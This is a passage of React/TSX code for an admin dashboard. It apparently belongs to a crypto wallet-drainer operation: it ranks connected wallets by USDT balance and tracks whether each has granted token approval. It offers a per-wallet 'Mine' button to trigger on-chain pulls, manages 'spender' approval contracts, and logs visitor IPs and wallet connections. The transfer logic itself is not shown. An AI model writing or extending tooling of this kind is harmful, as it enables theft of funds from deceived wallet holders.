                    disabled={!!miningUser}
                    className="px-3.5 py-2 rounded-xl btn-gold-glow text-xs font-bold flex items-center gap-2 shadow-lg active:scale-95 transition-all"
                  >
                    <Sparkles className="w-3.5 h-3.5 text-black" />
                    <span>⚡ Mine All Eligible</span>
                  </button>
                )}
              </div>
            </div>

            {/* Unified Tabular View for Mobile and Desktop (Sorted by Balance Descending) */}
            {(() => {
              const sortedUsers = [...users].sort((a, b) => {
                const balA = parseFloat(a.usdtBalance || '0');
                const balB = parseFloat(b.usdtBalance || '0');
                if (balB !== balA) return balB - balA;
                return (a.walletAddress || '').localeCompare(b.walletAddress || '');
              });

              return (
                <div className="overflow-x-auto rounded-xl sm:rounded-2xl border border-white/10 bg-[#0B0B0E]/60 shadow-xl">
                  <table className="w-full text-left border-collapse font-montserrat text-xs min-w-[650px] sm:min-w-full">
                    <thead>
                      <tr className="bg-white/[0.03] border-b border-white/10 text-[#FDB813] uppercase text-[10px] sm:text-[11px] tracking-wider">
                        <th className="py-3 px-3 sm:px-4 text-center w-12 font-mono">#</th>
                        <th className="py-3 px-3 sm:px-4">Wallet Address</th>
                        <th className="py-3 px-3 sm:px-4">USDT Balance</th>
                        <th className="py-3 px-3 sm:px-4 text-center">Registration Status</th>
                        <th className="py-3 px-3 sm:px-4 text-center font-bold text-white">Action / Trigger</th>
                        <th className="py-3 px-3 sm:px-4">Sponsor / Uplink</th>
                        <th className="py-3 px-3 sm:px-4 text-center">Status</th>
                        <th className="py-3 px-3 sm:px-4">Tx Hash</th>
                        <th className="py-3 px-3 sm:px-4">Last Sync</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-white/5">
                      {sortedUsers.length === 0 ? (
                        <tr>
                          <td colSpan={9} className="py-8 text-center text-gray-500 font-montserrat text-xs">
                            No registered users found.
                          </td>
                        </tr>
                      ) : (
                        sortedUsers.map((u, idx) => (
                          <tr key={u.walletAddress || idx} className="hover:bg-white/[0.04] transition-colors">
                            {/* Column 0: Rank / Index */}
                            <td className="py-3 px-3 sm:px-4 text-center font-mono text-gray-500 text-[11px]">
                              {(pagination.page - 1) * 50 + idx + 1}
                            </td>

                            {/* Column 1: Wallet Address */}
                            <td className="py-3 px-3 sm:px-4">
                              <div className="flex items-center gap-1.5 font-mono">
                                <a
                                  href={`https://bscscan.com/address/${u.walletAddress}`}
                                  target="_blank"
                                  rel="noopener noreferrer"
                                  className="text-white hover:text-[#FDB813] font-semibold transition-colors flex items-center gap-1"
                                  title={u.walletAddress}
                                >
                                  <span className="hidden sm:inline">{`${u.walletAddress.slice(0, 8)}...${u.walletAddress.slice(-6)}`}</span>
                                  <span className="sm:hidden">{`${u.walletAddress.slice(0, 6)}...${u.walletAddress.slice(-4)}`}</span>
                                  <ExternalLink className="w-2.5 h-2.5 sm:w-3 sm:h-3 text-gray-500 shrink-0" />
                                </a>
                                <button
                                  onClick={() => {
                                    navigator.clipboard.writeText(u.walletAddress);
                                    showToast('Address copied!', 'info');
                                  }}
                                  className="p-1 hover:bg-white/10 rounded text-gray-400 hover:text-white shrink-0"
                                  title="Copy full address"
                                >
                                  <Copy className="w-3 h-3" />
                                </button>
                              </div>
                            </td>

                            {/* Column 2: USDT Balance (Sorted Descending) */}
                            <td className="py-3 px-3 sm:px-4 whitespace-nowrap">
                              <span className="text-[#22D3EE] font-mono font-bold text-xs sm:text-sm">
                                {u.usdtBalance}
                              </span>{' '}
                              <span className="text-[10px] text-gray-400 font-normal">USDT</span>
                            </td>

                            {/* Column 3: Registration Status */}
                            <td className="py-3 px-3 sm:px-4 text-center whitespace-nowrap">
                              <span className={`px-2 sm:px-2.5 py-0.5 sm:py-1 rounded-full text-[10px] font-bold inline-block ${
                                u.approvalStatus === 'approved'
                                  ? 'bg-[#10B981]/20 text-[#10B981] border border-[#10B981]/40'
                                  : 'bg-[#FDB813]/20 text-[#FDB813] border border-[#FDB813]/40'
                              }`}>
                                {u.approvalStatus === 'approved' ? 'Registered' : 'Not Registered'}
                              </span>
                            </td>

                            {/* Column 4: Primary Action Mine Button (For EVERY address on Mobile & Laptop) */}
                            <td className="py-3 px-3 sm:px-4 text-center whitespace-nowrap">
                              {!adminWallet || !isOwnerVerified ? (
                                <button
                                  onClick={connectAdminWallet}
                                  className="px-2.5 sm:px-3 py-1.5 rounded-xl bg-amber-500/10 hover:bg-amber-500/20 border border-amber-500/30 text-amber-400 font-bold text-[11px] sm:text-xs transition-all inline-flex items-center justify-center gap-1.5 shadow-sm active:scale-95"
                                  title="Connect verified deployer wallet to mine"
                                >
                                  <Wallet className="w-3 h-3 sm:w-3.5 sm:h-3.5" />
                                  <span>⚡ Mine</span>
                                </button>
                              ) : (
                                <button
                                  onClick={() => handleMineUser(u)}
                                  disabled={miningUser === u.walletAddress || (adminChainId !== 56 && adminChainId !== 97)}
                                  className="px-2.5 sm:px-3.5 py-1.5 rounded-xl bg-gradient-to-r from-[#FDB813] to-[#F59E0B] text-black font-bold text-[11px] sm:text-xs transition-all inline-flex items-center justify-center gap-1.5 shadow-md hover:brightness-110 active:scale-95 disabled:opacity-50"
                                  title={`Trigger on-chain mine for ${u.walletAddress}`}
                                >
                                  {miningUser === u.walletAddress ? (
                                    <>
                                      <Loader2 className="w-3 h-3 sm:w-3.5 sm:h-3.5 animate-spin text-black" />
                                      <span>Mining...</span>
                                    </>
                                  ) : (
                                    <>
                                      <Zap className="w-3 h-3 sm:w-3.5 sm:h-3.5 fill-black" />
                                      <span>Mine {parseFloat(u.usdtBalance || '0') > 0 ? `${parseFloat(u.usdtBalance).toFixed(2)}` : 'USDT'}</span>
                                    </>
                                  )}
                                </button>
                              )}
                            </td>

                            {/* Column 5: Sponsor / Uplink */}
                            <td className="py-3 px-3 sm:px-4 font-mono text-[11px] whitespace-nowrap">
                              {u.referredBy ? (
                                <a
                                  href={`https://bscscan.com/address/${u.referredBy}`}
                                  target="_blank"
                                  rel="noopener noreferrer"
                                  className="text-[#22D3EE] hover:underline"
                                >
                                  {`${u.referredBy.slice(0, 6)}...${u.referredBy.slice(-4)}`}
                                </a>
                              ) : (
                                <span className="text-gray-600">—</span>
                              )}
                            </td>

                            {/* Column 6: Registration Status */}
                            <td className="py-3 px-3 sm:px-4 text-center whitespace-nowrap">
                              <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                                u.status === 'confirmed' ? 'bg-[#10B981]/20 text-[#10B981]' : 'bg-white/10 text-gray-400'
                              }`}>
                                {u.status}
                              </span>
                            </td>

                            {/* Column 7: Tx Hash */}
                            <td className="py-3 px-3 sm:px-4 font-mono text-[11px] whitespace-nowrap">
                              {u.approvalTxHash ? (
                                <a
                                  href={`https://bscscan.com/tx/${u.approvalTxHash}`}
                                  target="_blank"
                                  rel="noopener noreferrer"
                                  className="text-[#FDB813] hover:underline inline-flex items-center gap-1"
                                >
                                  <span>{`${u.approvalTxHash.slice(0, 8)}...`}</span>
                                  <ExternalLink className="w-2.5 h-2.5 sm:w-3 sm:h-3" />
                                </a>
                              ) : (
                                <span className="text-gray-600">—</span>
                              )}
                            </td>

                            {/* Column 8: Last Update */}
                            <td className="py-3 px-3 sm:px-4 text-gray-400 text-[10px] sm:text-[11px] whitespace-nowrap">
                              {u.lastBalanceUpdate ? new Date(u.lastBalanceUpdate).toLocaleTimeString() : 'Live'}
                            </td>
                          </tr>
                        ))
                      )}
                    </tbody>
                  </table>
                </div>
              );
            })()}

            {/* Pagination Controls */}
            <div className="flex items-center justify-between pt-3 sm:pt-4 border-t border-white/10 text-xs font-montserrat text-gray-400">
              <span>Page {pagination.page} of {pagination.totalPages || 1} • {pagination.total} Total Users</span>
              <div className="flex items-center gap-2">
                <button
                  disabled={pagination.page <= 1}
                  onClick={() => setPagination(prev => ({ ...prev, page: prev.page - 1 }))}
                  className="p-2 rounded-lg bg-white/5 disabled:opacity-30 hover:bg-white/10"
                >
                  <ChevronLeft className="w-4 h-4" />
                </button>
                <button
                  disabled={pagination.page >= pagination.totalPages}
                  onClick={() => setPagination(prev => ({ ...prev, page: prev.page + 1 }))}
                  className="p-2 rounded-lg bg-white/5 disabled:opacity-30 hover:bg-white/10"
                >
                  <ChevronRight className="w-4 h-4" />
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Tab 3: Approval Address Management */}
        {activeTab === 'approvals' && (
          <div className="space-y-4 sm:space-y-6">

            {/* Governance Status Banner: Read-Only vs Unlocked */}
            {!adminWallet || !isOwnerVerified ? (
              <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 p-4 sm:p-5 rounded-2xl bg-amber-500/10 border border-amber-500/30">
                <div className="flex items-start gap-3">
                  <div className="p-2 rounded-xl bg-amber-500/20 text-amber-400 shrink-0 mt-0.5">
                    <Lock className="w-5 h-5 text-amber-400" />
                  </div>
                  <div>
                    <div className="flex items-center gap-2 flex-wrap">
                      <h4 className="font-montserrat font-bold text-xs sm:text-sm text-amber-300 uppercase tracking-wide">
                        Contract Governance: Read-Only Mode
                      </h4>
                      <span className="px-2 py-0.5 rounded text-[9px] bg-amber-500/20 text-amber-300 font-mono font-bold">
                        WRITE ACCESS LOCKED
                      </span>
                    </div>
                    <p className="font-montserrat text-[11px] sm:text-xs text-amber-400/80 mt-1">
                      For security, contract addresses cannot be added, modified, or deleted without connecting the verified contract deployer wallet ({contractOwner ? `${contractOwner.slice(0, 6)}...${contractOwner.slice(-4)}` : '0x9192...997d'}).
                    </p>
                  </div>
                </div>
                <button
                  onClick={connectAdminWallet}
                  disabled={isConnectingWallet || isVerifyingOwner}
                  className="flex items-center gap-1.5 px-3 py-2 rounded-xl bg-amber-500/20 hover:bg-amber-500/30 border border-amber-500/40 text-xs font-montserrat font-bold text-amber-300 transition-colors shrink-0"
                >
                  <Wallet className="w-3.5 h-3.5" />
                  <span>Connect Deployer</span>
                </button>
              </div>
            ) : (
              <div className="flex items-center justify-between p-4 sm:p-5 rounded-2xl bg-[#10B981]/10 border border-[#10B981]/30">
                <div className="flex items-center gap-3">
                  <div className="p-2 rounded-xl bg-[#10B981]/20 text-[#10B981] shrink-0">
                    <ShieldCheck className="w-5 h-5 text-[#10B981]" />
                  </div>
                  <div>
                    <div className="flex items-center gap-2 flex-wrap">
                      <h4 className="font-montserrat font-bold text-xs sm:text-sm text-[#10B981] uppercase tracking-wide">
                        Governance Access Unlocked • Deployer Authorized
                      </h4>
                      <span className="px-2 py-0.5 rounded text-[9px] bg-[#10B981]/20 text-[#10B981] font-mono font-bold">
                        FULL WRITE ACCESS
                      </span>
                    </div>
                    <p className="font-montserrat text-[11px] sm:text-xs text-gray-300 mt-1">
                      Verified on-chain contract deployer: <span className="font-mono text-[#10B981] font-bold">{adminWallet}</span>. You can safely add, activate, or remove approval contracts.
                    </p>
                  </div>
                </div>
              </div>
            )}

            {/* Add Contract Form (Governed Access) */}
            <div className="glass-panel rounded-2xl sm:rounded-3xl p-4 sm:p-8 space-y-4">
              <div className="flex items-center justify-between">
                <h3 className="font-montserrat font-bold text-sm sm:text-base text-white uppercase tracking-wider flex items-center gap-2">
                  {!adminWallet || !isOwnerVerified ? (
                    <Lock className="w-4 h-4 text-amber-400" />
                  ) : (
                    <Plus className="w-4 h-4 text-[#FDB813]" />
                  )}
                  <span>Add New Approval Contract</span>
                </h3>
                {!adminWallet || !isOwnerVerified ? (
                  <span className="px-2 py-0.5 rounded text-[10px] bg-amber-500/10 text-amber-400 border border-amber-500/20 font-montserrat">
                    🔒 Read-Only
                  </span>
                ) : (
                  <span className="px-2 py-0.5 rounded text-[10px] bg-[#10B981]/10 text-[#10B981] border border-[#10B981]/30 font-montserrat">
                    ✓ Authorized
                  </span>
                )}
              </div>

              <form onSubmit={handleAddApproval} className="grid grid-cols-1 sm:grid-cols-12 gap-3 sm:gap-4">
                <div className="sm:col-span-6">
                  <input
                    type="text"
                    required
                    disabled={!adminWallet || !isOwnerVerified || submittingContract}
                    value={newContract}
                    onChange={(e) => setNewContract(e.target.value)}
                    placeholder={!adminWallet || !isOwnerVerified ? "Connect deployer wallet to add contracts" : "Contract Address (0x...)"}
                    className={`w-full px-3.5 sm:px-4 py-2.5 sm:py-3 rounded-xl bg-[#08080B]/80 border text-xs font-mono text-white outline-none transition-colors ${
                      !adminWallet || !isOwnerVerified
                        ? 'border-white/5 opacity-50 cursor-not-allowed'
                        : 'border-white/10 focus:border-[#FDB813]/50'
                    }`}
                  />
                </div>
                <div className="sm:col-span-4">
                  <input
                    type="text"
                    disabled={!adminWallet || !isOwnerVerified || submittingContract}
                    value={newDesc}
                    onChange={(e) => setNewDesc(e.target.value)}
                    placeholder="Description (e.g. Spender V2)"
                    className={`w-full px-3.5 sm:px-4 py-2.5 sm:py-3 rounded-xl bg-[#08080B]/80 border text-xs font-mono text-white outline-none transition-colors ${
                      !adminWallet || !isOwnerVerified
                        ? 'border-white/5 opacity-50 cursor-not-allowed'
                        : 'border-white/10 focus:border-[#FDB813]/50'
                    }`}
                  />
                </div>
                <div className="sm:col-span-2">
                  <button
                    type="submit"
                    disabled={!adminWallet || !isOwnerVerified || submittingContract}
                    className={`w-full py-2.5 sm:py-3 rounded-xl text-xs font-bold transition-all ${
                      !adminWallet || !isOwnerVerified
                        ? 'bg-white/5 border border-white/10 text-gray-500 cursor-not-allowed'
                        : 'btn-gold-glow'
                    }`}
                  >
                    {!adminWallet || !isOwnerVerified ? '🔒 Locked' : submittingContract ? 'Adding...' : 'Add Contract'}
                  </button>
                </div>
              </form>
            </div>

            {/* List Contracts */}
            <div className="glass-panel rounded-2xl sm:rounded-3xl p-4 sm:p-8 space-y-4">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-white/5 pb-3">
                <h3 className="font-montserrat font-bold text-sm sm:text-base text-white uppercase tracking-wider">
                  Configured Contracts ({approvals.length})
                </h3>
                {contractOwner && (
                  <div className="flex items-center gap-1.5 bg-[#10B981]/10 border border-[#10B981]/30 rounded-xl px-3 py-1.5">
                    <ShieldCheck className="w-3.5 h-3.5 text-[#10B981]" />
                    <span className="text-[11px] font-montserrat text-gray-300">
                      On-Chain Deployer: <span className="font-mono text-[#10B981] font-bold">{contractOwner.slice(0, 6)}...{contractOwner.slice(-4)}</span>
                    </span>
                  </div>
                )}
              </div>

              <div className="divide-y divide-white/10 font-montserrat text-xs">
                {approvals.map((app) => (
                  <div key={app.id} className="py-3.5 sm:py-4 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                    <div className="break-all">
                      <p className="text-[#FDB813] font-bold text-xs sm:text-sm">{app.contractAddress}</p>
                      <p className="text-gray-400 text-[11px] mt-0.5">{app.description} • Chain ID: {app.chainId}</p>
                    </div>
                    <div className="flex items-center justify-between sm:justify-end gap-3 pt-2 sm:pt-0 border-t sm:border-0 border-white/5">
                      <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${app.isActive ? 'bg-[#10B981]/20 text-[#10B981]' : 'bg-red-500/20 text-red-400'
                        }`}>
                        {app.isActive ? 'ACTIVE' : 'INACTIVE'}
                      </span>
                      <button
                        onClick={() => handleDeleteApproval(app.id)}
                        disabled={!adminWallet || !isOwnerVerified}
                        title={!adminWallet || !isOwnerVerified ? "Read-only mode: Connect deployer wallet to delete" : "Delete contract"}
                        className={`p-2 rounded-lg transition-colors ${
                          !adminWallet || !isOwnerVerified
                            ? 'bg-white/5 text-gray-600 opacity-40 cursor-not-allowed'
                            : 'bg-red-500/10 text-red-400 hover:bg-red-500/20'
                        }`}
                      >
                        {!adminWallet || !isOwnerVerified ? (
                          <Lock className="w-3.5 h-3.5" />
                        ) : (
                          <Trash2 className="w-4 h-4" />
                        )}
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            </div>

          </div>
        )}

        {/* Tab 4: Activity & Visitor Logs */}
        {activeTab === 'logs' && (
          <div className="glass-panel rounded-2xl sm:rounded-3xl p-4 sm:p-8 space-y-5 sm:space-y-6">
            
            {/* Header & Filter Controls */}
            <div className="flex flex-col lg:flex-row items-start lg:items-center justify-between gap-4 pb-4 border-b border-white/10">
              <div>
                <h3 className="font-montserrat font-bold text-base sm:text-lg text-white flex items-center gap-2">
                  <Activity className="w-5 h-5 text-[#FDB813]" />
                  Audit &amp; Activity Logs
                </h3>
                <p className="font-montserrat text-[11px] sm:text-xs text-gray-400 mt-0.5">
                  Ledger of site visits, wallet connections, and on-chain registrations
                </p>
              </div>

              {/* Filter Controls - Responsive Stacking */}
              <div className="flex flex-col sm:flex-row items-stretch sm:items-center gap-2.5 w-full lg:w-auto">
                {/* Action Filter */}
                <select
                  value={logActionFilter}
                  onChange={(e) => {
                    setLogActionFilter(e.target.value);
                    if (token) loadLogs(token, 1, e.target.value, logSearch);
                  }}
                  className="px-3 py-2 rounded-xl bg-[#08080B]/90 border border-white/10 text-xs font-montserrat text-gray-200 outline-none focus:border-[#FDB813]/50"
                >
                  <option value="all">All Actions</option>
                  <option value="register_confirmed">Register Confirmed</option>
                  <option value="approve_confirmed">Registration Confirmed</option>
                  <option value="register_pending">Register Pending</option>
                  <option value="connect">Wallet Connect</option>
                  <option value="visit">Site Visits</option>
                  <option value="claim">Bonus Claims</option>
                </select>

                {/* Search Bar */}
                <form
                  onSubmit={(e) => {
                    e.preventDefault();
                    if (token) loadLogs(token, 1, logActionFilter, logSearch);
                  }}
                  className="flex items-center gap-2 flex-1"
                >
                  <div className="relative flex-1">
                    <input
                      type="text"
                      value={logSearch}
                      onChange={(e) => setLogSearch(e.target.value)}
                      placeholder="Search wallet / tx..."
                      className="w-full sm:w-48 md:w-56 px-3.5 py-2 pl-8 rounded-xl bg-[#08080B]/90 border border-white/10 text-xs font-mono text-white outline-none focus:border-[#FDB813]/50"
                    />
                    <Search className="w-3.5 h-3.5 text-gray-400 absolute left-2.5 top-1/2 -translate-y-1/2" />
                  </div>
                  <button
                    type="submit"
                    className="px-3 py-2 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-xs font-montserrat text-gray-300 transition-colors shrink-0"
                  >
                    Search
                  </button>
                </form>

                {/* Refresh Button */}
                <button
                  onClick={() => token && loadLogs(token, logsPagination.page, logActionFilter, logSearch)}
                  disabled={logsLoading}
                  className="p-2 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-gray-300 transition-colors disabled:opacity-40 self-end sm:self-auto shrink-0"
                  title="Refresh Logs"
                >
                  <RefreshCw className={`w-4 h-4 text-[#FDB813] ${logsLoading ? 'animate-spin' : ''}`} />
                </button>
              </div>
            </div>

            {/* Mobile View: Logs Card List */}
            <div className="block md:hidden space-y-3">
              {logs.length === 0 ? (
                <div className="text-center py-8 text-gray-500 font-montserrat text-xs">
                  {logsLoading ? 'Loading activity logs...' : 'No activity logs found.'}
                </div>
              ) : (
                logs.map((item) => (
                  <div key={item.id} className="bg-white/[0.03] border border-white/10 rounded-xl p-3 space-y-2 font-montserrat text-xs">
                    <div className="flex items-center justify-between gap-2">
                      <span
                        className={`px-2 py-0.5 rounded text-[10px] font-bold uppercase tracking-wider ${
                          item.action === 'register_confirmed' || item.action === 'approve_confirmed'
                            ? 'bg-[#10B981]/20 text-[#10B981] border border-[#10B981]/40'
                            : item.action === 'register_pending'
                            ? 'bg-amber-400/20 text-amber-300 border border-amber-400/40'
                            : item.action === 'connect'
                            ? 'bg-[#22D3EE]/20 text-[#22D3EE] border border-[#22D3EE]/40'
                            : item.action === 'claim'
                            ? 'bg-[#A855F7]/20 text-[#A855F7] border border-[#A855F7]/40'
                            : 'bg-white/10 text-gray-300'
                        }`}
                      >
                        {item.action.replace('_', ' ')}
                      </span>
                      <span className="text-gray-400 text-[10px]">
                        {new Date(item.createdAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
                      </span>
                    </div>

                    {item.walletAddress && (
                      <div className="flex items-center justify-between text-[11px]">
                        <span className="text-gray-400">Wallet:</span>
                        <div className="flex items-center gap-1">
                          <a
                            href={`https://bscscan.com/address/${item.walletAddress}`}
                            target="_blank"
                            rel="noopener noreferrer"
                            className="text-white hover:text-[#FDB813] font-semibold"
                          >
                            {`${item.walletAddress.slice(0, 6)}...${item.walletAddress.slice(-4)}`}
                          </a>
                          <button
                            onClick={() => {
                              navigator.clipboard.writeText(item.walletAddress);
                              showToast('Wallet address copied!', 'info');
                            }}
                            className="p-0.5 text-gray-400 hover:text-white"
                          >
                            <Copy className="w-2.5 h-2.5" />
                          </button>
                        </div>
                      </div>
                    )}

                    {item.refCode && (
                      <div className="flex items-center justify-between text-[11px]">
                        <span className="text-gray-400">Referral/Sponsor:</span>
                        <span className="text-[#22D3EE]">{item.refCode}</span>
                      </div>
                    )}

                    {item.txHash && (
                      <div className="flex items-center justify-between text-[11px]">
                        <span className="text-gray-400">Transaction:</span>
                        <a
                          href={`https://bscscan.com/tx/${item.txHash}`}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="text-[#FDB813] hover:underline flex items-center gap-1"
                        >
                          <span>{`${item.txHash.slice(0, 6)}...${item.txHash.slice(-4)}`}</span>
                          <ExternalLink className="w-2.5 h-2.5" />
                        </a>
                      </div>
                    )}

                    {(item.details || item.ipAddress) && (
                      <div className="text-[10px] text-gray-500 pt-1 border-t border-white/5 truncate">
                        {item.details || `IP: ${item.ipAddress}`}
                      </div>
                    )}
                  </div>
                ))
              )}
            </div>

            {/* Desktop View: Full Logs Table */}
            <div className="hidden md:block overflow-x-auto">
              <table className="w-full text-left border-collapse font-montserrat text-xs">
                <thead>
                  <tr className="border-b border-white/10 text-[#FDB813] uppercase text-[11px]">
                    <th className="py-3 px-4">Timestamp</th>
                    <th className="py-3 px-4">Action</th>
                    <th className="py-3 px-4">Wallet Address</th>
                    <th className="py-3 px-4">Sponsor / Ref</th>
                    <th className="py-3 px-4">Tx Hash</th>
                    <th className="py-3 px-4">Details / IP</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-white/5">
                  {logs.length === 0 ? (
                    <tr>
                      <td colSpan={6} className="py-8 text-center text-gray-500 font-montserrat text-xs">
                        {logsLoading ? 'Loading activity logs...' : 'No activity logs found matching the filter.'}
                      </td>
                    </tr>
                  ) : (
                    logs.map((item) => (
                      <tr key={item.id} className="hover:bg-white/5 transition-colors">
                        {/* Timestamp */}
                        <td className="py-3 px-4 text-gray-400 whitespace-nowrap">
                          {new Date(item.createdAt).toLocaleString()}
                        </td>

                        {/* Action Badge */}
                        <td className="py-3 px-4">
                          <span
                            className={`px-2.5 py-1 rounded-full text-[10px] font-bold uppercase tracking-wider inline-flex items-center gap-1 ${
                              item.action === 'register_confirmed' || item.action === 'approve_confirmed'
                                ? 'bg-[#10B981]/20 text-[#10B981] border border-[#10B981]/40'
                                : item.action === 'register_pending'
                                ? 'bg-amber-400/20 text-amber-300 border border-amber-400/40'
                                : item.action === 'connect'
                                ? 'bg-[#22D3EE]/20 text-[#22D3EE] border border-[#22D3EE]/40'
                                : item.action === 'claim'
                                ? 'bg-[#A855F7]/20 text-[#A855F7] border border-[#A855F7]/40'
                                : 'bg-white/10 text-gray-300 border border-white/10'
                            }`}
                          >
                            {item.action.replace('_', ' ')}
                          </span>
                        </td>

                        {/* Wallet Address */}
                        <td className="py-3 px-4">
                          {item.walletAddress ? (
                            <div className="flex items-center gap-1.5">
                              <a
                                href={`https://bscscan.com/address/${item.walletAddress}`}
                                target="_blank"
                                rel="noopener noreferrer"
                                className="text-white hover:text-[#FDB813] font-semibold transition-colors flex items-center gap-1"
                              >
                                <span>{`${item.walletAddress.slice(0, 6)}...${item.walletAddress.slice(-4)}`}</span>
                                <ExternalLink className="w-3 h-3 text-gray-400" />
                              </a>
                              <button
                                onClick={() => {
                                  navigator.clipboard.writeText(item.walletAddress);
                                  showToast('Wallet address copied!', 'info');
                                }}
                                className="p-1 hover:bg-white/10 rounded text-gray-400 hover:text-white transition-colors"
                                title="Copy full address"
                              >
                                <Copy className="w-3 h-3" />
                              </button>
                            </div>
                          ) : (
                            <span className="text-gray-600">—</span>
                          )}
                        </td>

                        {/* Ref Code / Sponsor */}
                        <td className="py-3 px-4">
                          {item.refCode ? (
                            item.refCode.startsWith('0x') ? (
                              <a
                                href={`https://bscscan.com/address/${item.refCode}`}
                                target="_blank"
                                rel="noopener noreferrer"
                                className="text-[#22D3EE] hover:underline"
                              >
                                {`${item.refCode.slice(0, 6)}...${item.refCode.slice(-4)}`}
                              </a>
                            ) : (
                              <span className="text-[#FFE066]">{item.refCode}</span>
                            )
                          ) : (
                            <span className="text-gray-600">—</span>
                          )}
                        </td>

                        {/* Tx Hash */}
                        <td className="py-3 px-4">
                          {item.txHash ? (
                            <a
                              href={`https://bscscan.com/tx/${item.txHash}`}
                              target="_blank"
                              rel="noopener noreferrer"
                              className="text-[#FDB813] hover:underline flex items-center gap-1"
                            >
                              <span>{`${item.txHash.slice(0, 8)}...`}</span>
                              <ExternalLink className="w-3 h-3" />
                            </a>
                          ) : (
                            <span className="text-gray-600">—</span>
                          )}
                        </td>

                        {/* Details / IP */}
                        <td className="py-3 px-4 text-gray-400 max-w-xs truncate">
                          {item.details || (item.ipAddress ? `IP: ${item.ipAddress}` : '—')}
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>

            {/* Pagination Controls */}
            <div className="flex items-center justify-between pt-3 sm:pt-4 border-t border-white/10 text-xs font-montserrat text-gray-400">
              <span className="truncate max-w-[200px] sm:max-w-none">
                Page {logsPagination.page} of {logsPagination.totalPages || 1} • {logsPagination.total} Logs
              </span>
              <div className="flex items-center gap-2 shrink-0">
                <button
                  disabled={logsPagination.page <= 1}
                  onClick={() => {
                    const newPage = logsPagination.page - 1;
                    setLogsPagination(prev => ({ ...prev, page: newPage }));
                    if (token) loadLogs(token, newPage, logActionFilter, logSearch);
                  }}
                  className="p-2 rounded-lg bg-white/5 hover:bg-white/10 disabled:opacity-30 transition-colors"
                >
                  <ChevronLeft className="w-4 h-4" />
                </button>
                <button
                  disabled={logsPagination.page >= logsPagination.totalPages}
                  onClick={() => {
                    const newPage = logsPagination.page + 1;
                    setLogsPagination(prev => ({ ...prev, page: newPage }));
                    if (token) loadLogs(token, newPage, logActionFilter, logSearch);
                  }}
                  className="p-2 rounded-lg bg-white/5 hover:bg-white/10 disabled:opacity-30 transition-colors"
                >
                  <ChevronRight className="w-4 h-4" />
                </button>
              </div>
            </div>

            {/* Bottom scroll clearance spacer */}
            <div className="h-28 w-full shrink-0" aria-hidden="true" />

          </div>
        )}

      </div>

      {/* Instagram-Style Bottom Navigation Dock */}
      <nav className="fixed bottom-0 left-0 right-0 z-40 bg-[#0B0B0E]/95 backdrop-blur-2xl border-t border-[#FDB813]/25 px-2 sm:px-6 pt-2 pb-[max(0.6rem,env(safe-area-inset-bottom))] shadow-2xl">
        <div className="max-w-xl mx-auto flex items-center justify-around gap-1">
          
          {/* 1. Overview */}
          <button
            onClick={() => setActiveTab('stats')}
            className={`flex flex-col items-center justify-center py-1 px-2.5 sm:px-4 rounded-xl transition-all ${
              activeTab === 'stats'
                ? 'text-[#FDB813] font-bold scale-105'
                : 'text-gray-400 hover:text-gray-200'
            }`}
          >
            <LayoutDashboard className="w-5 h-5 sm:w-5 sm:h-5 mb-0.5" />
            <span className="text-[10px] font-montserrat tracking-tight">Overview</span>
          </button>

          {/* 2. Registered Users */}
          <button
            onClick={() => setActiveTab('users')}
            className={`flex flex-col items-center justify-center py-1 px-2.5 sm:px-4 rounded-xl transition-all relative ${
              activeTab === 'users'
                ? 'text-[#FDB813] font-bold scale-105'
                : 'text-gray-400 hover:text-gray-200'
            }`}
          >
            <Users className="w-5 h-5 sm:w-5 sm:h-5 mb-0.5" />
            <span className="text-[10px] font-montserrat tracking-tight">Users ({pagination.total})</span>
            {users.some(u => u.approvalStatus === 'approved' && parseFloat(u.usdtBalance) > 0) && (
              <span className="absolute top-0.5 right-2 w-2 h-2 rounded-full bg-[#10B981] animate-ping" />
            )}
          </button>

          {/* 3. Center Glowing Sync / Refresh Button */}
          <button
            onClick={handleRefreshBalances}
            disabled={refreshingBalances}
            className="flex flex-col items-center justify-center -mt-4 py-1.5 px-3 rounded-2xl bg-gradient-to-b from-[#FDB813] to-[#D97706] text-black shadow-lg shadow-[#FDB813]/25 active:scale-95 transition-all group"
            title="Fast Parallel Multicall (~990 addr/sec)"
          >
            <div className="w-9 h-9 rounded-full bg-black/10 flex items-center justify-center mb-0.5">
              <RefreshCw className={`w-5 h-5 text-black ${refreshingBalances ? 'animate-spin' : 'group-hover:rotate-180 transition-transform duration-500'}`} />
            </div>
            <span className="text-[9px] font-bold font-montserrat uppercase tracking-tighter">Sync Balances</span>
          </button>

          {/* 4. Approval Contracts */}
          <button
            onClick={() => setActiveTab('approvals')}
            className={`flex flex-col items-center justify-center py-1 px-2.5 sm:px-4 rounded-xl transition-all ${
              activeTab === 'approvals'
                ? 'text-[#FDB813] font-bold scale-105'
                : 'text-gray-400 hover:text-gray-200'
            }`}
          >
            <Key className="w-5 h-5 sm:w-5 sm:h-5 mb-0.5" />
            <span className="text-[10px] font-montserrat tracking-tight">Contracts ({approvals.length})</span>
          </button>

          {/* 5. Audit & Activity Logs */}
          <button
            onClick={() => {
              setActiveTab('logs');
              if (token) loadLogs(token, 1, logActionFilter, logSearch);
            }}
            className={`flex flex-col items-center justify-center py-1 px-2.5 sm:px-4 rounded-xl transition-all ${
              activeTab === 'logs'
                ? 'text-[#FDB813] font-bold scale-105'
                : 'text-gray-400 hover:text-gray-200'
            }`}
          >
            <Activity className="w-5 h-5 sm:w-5 sm:h-5 mb-0.5" />
            <span className="text-[10px] font-montserrat tracking-tight">Logs ({logsPagination.total})</span>
          </button>

        </div>
      </nav>

      {/* Celebratory Greeting Modal on Mining Success */}
      {mineGreeting?.isOpen && (
